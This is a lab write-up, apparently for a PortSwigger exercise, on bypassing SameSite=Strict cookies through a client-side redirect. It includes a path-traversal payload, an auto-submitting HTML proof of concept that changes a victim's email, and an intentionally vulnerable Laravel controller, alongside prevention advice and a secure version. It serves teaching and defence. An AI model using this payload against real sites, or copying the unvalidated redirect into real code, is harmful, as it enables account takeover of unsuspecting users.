# 07-CSRF SameSite Strict Bypass via Client-Side Redirect

## 🔥 Lab: SameSite Strict bypass via client-side redirect

### 🧠 Concept

Application used:

```text id="j39d2w"
SameSite=Strict
```

for session cookies.

Normally this prevents CSRF because browser does not send authenticated cookies during cross-site requests.

But application contained a:

```text id="wfd6x4"
client-side redirect
```

which transformed:

```text id="w2w10e"
cross-site request
→ same-site navigation
```

After redirect, browser attached authenticated cookies.

Result:

```text id="6rjvlg"
CSRF protection bypassed.
```

---

# 🌐 SameSite Strict Behavior

## Normal Cross-Site Request

Victim visits attacker website:

```text id="w5fto8"
evil.com
```

Attacker tries:

```text id="e79uqx"
POST /change-email
```

Browser behavior:

```text id="xjlwmc"
Strict cookies NOT sent
```

Request becomes unauthenticated.

Direct CSRF fails ❌

---

# 💡 Important Insight

```text id="8x1gk2"
SameSite protects cookies
during cross-site requests only.
```

If application causes an internal navigation/redirect:

```text id="n1z07h"
browser may treat it as same-site.
```

Then cookies are included again.

---

# 🔎 Discovery

Found endpoint:

```text id="ycf0y4"
/post/comment/confirmation
```

Request:

```http id="jlwmh3"
GET /post/comment/confirmation?postId=1
```

Observed behavior:

```text id="k8l56e"
Application redirects/navigates
using user-controlled postId.
```

---

# 🧪 Testing

## Normal value

```text id="4h1wgi"
postId=1
```

Redirected correctly.

---

## Path traversal test

Payload:

```text id="vhjkk6"
../../../../my-account
```

Success ✅ (for lab solve & kop change karo encode karo)

Application normalized path traversal.

---

# 🔥 Exploitable Payload

```text id="7lh0lj"
../../../../my-account/change-email?email=attacker@gmail.com&submit=1
```

---

# 🚀 Final PoC

```html id="n23l0f"
<html>
  <body>

    <form action="https://LAB-ID.web-security-academy.net/post/comment/confirmation">

      <input type="hidden"
             name="postId"
             value="../../../../my-account/change-email?email=attacker@gmail.com&submit=1">

    </form>

    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>

  </body>
</html>
```

---

# ⚙️ Attack Flow

## Step 1

Victim opens attacker page.

---

## Step 2

Cross-site request sent to:

```text id="3v97oh"
/post/comment/confirmation
```

At this point:

```text id="4y5g4v"
Strict cookies blocked
```

---

## Step 3

Application performs redirect/navigation using attacker input.

Redirect target:

```text id="jlwmx4"
/my-account/change-email?email=attacker@gmail.com&submit=1
```

---

## Step 4

Browser treats redirect as same-site navigation.

Now:

```text id="xwyvya"
session cookies included
```

---

## Step 5

Sensitive action executes successfully.

Email changed ✅

---

# 💻 Vulnerable Laravel Example

## ❌ Insecure Controller

```php id="qkm68s"
<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class CommentController extends Controller
{
    public function confirmation(Request $request)
    {
        $postId = $request->get('postId');

        return redirect("/post/" . $postId);
    }
}
```

---

# 💥 Why Vulnerable

Attacker supplies:

```text id="1zbh4p"
../../../../my-account/change-email?email=attacker@gmail.com&submit=1
```

Application generates:

```text id="m3x52z"
/post/../../../../my-account/change-email
```

Browser normalizes traversal:

```text id="sh8sdo"
../
```

and reaches sensitive endpoint.

---

# ❌ Developer Mistakes

## 1. User-controlled redirect path

```php id="n0uk4q"
redirect("/post/" . $postId)
```

Unsafe.

---

## 2. No path traversal filtering

No validation against:

```text id="hmpm0t"
../
```

---

## 3. Relied only on SameSite

Developer assumed:

```text id="fwb9c8"
SameSite=Strict eliminates CSRF
```

False assumption.

---

## 4. No CSRF token validation

Sensitive endpoint still allowed state-changing GET request.

---

# 🔬 Browser Behavior Behind The Bypass

## Initial Request

```text id="ax44j4"
Cross-site
```

Cookies blocked.

---

## After Internal Redirect

```text id="f5kjqq"
Same-site navigation
```

Cookies allowed.

---

# 🧠 Root Cause

```text id="jlwmok"
Application transformed
an attacker-controlled cross-site request
into a same-site authenticated request.
```

---

# ❌ Vulnerable Client-Side JavaScript Example

```javascript id="l43r04"
location = "/post/" + postId;
```

or:

```javascript id="xjlwmv"
window.location = userInput;
```

without validation.

---

# 🛡️ Prevention

## ✅ Use proper CSRF protection

Laravel built-in middleware:

```php id="8gfd6f"
VerifyCsrfToken
```

---

## ✅ Validate redirect input

Reject traversal sequences:

```text id="k8xow6"
../
```

---

## ✅ Use allowlisted values

Example:

```php id="y4z4p6"
$allowed = ['1', '2', '3'];

if (!in_array($postId, $allowed)) {
    abort(400);
}
```

---

## ✅ Use named routes

Better:

```php id="jlwm8k"
return redirect()->route('post.show', [
    'id' => $postId
]);
```

---

## ✅ Validate parameter type

```php id="qfjlwm"
$request->validate([
    'postId' => 'required|integer|min:1'
]);
```

---

## ✅ Use POST + CSRF tokens for sensitive actions

Never allow:

```text id="y6hh5p"
GET /change-email
```

for state-changing actions.

---

# 🔐 Secure Laravel Example

```php id="mjlwm1"
<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class CommentController extends Controller
{
    public function confirmation(Request $request)
    {
        $request->validate([
            'postId' => 'required|integer|min:1'
        ]);

        return redirect()->route('post.show', [
            'id' => $request->postId
        ]);
    }
}
```

---

# 💬 Key Learnings

```text id="jlwm2"
SameSite is a mitigation,
not a complete CSRF defense.
```

---

```text id="jlwm3"
Client-side redirects can convert
cross-site requests into same-site requests.
```

---

```text id="jlwm4"
Never trust user input
inside redirects or navigation paths.
```

---

```text id="jlwm5"
Sensitive actions must always use
server-side CSRF validation.
```

---

# 🏁 Tags

```text id="jlwm6"
#csrf
#samesite
#client-side-redirect
#path-traversal
#laravel
#portswigger
#web-security
```
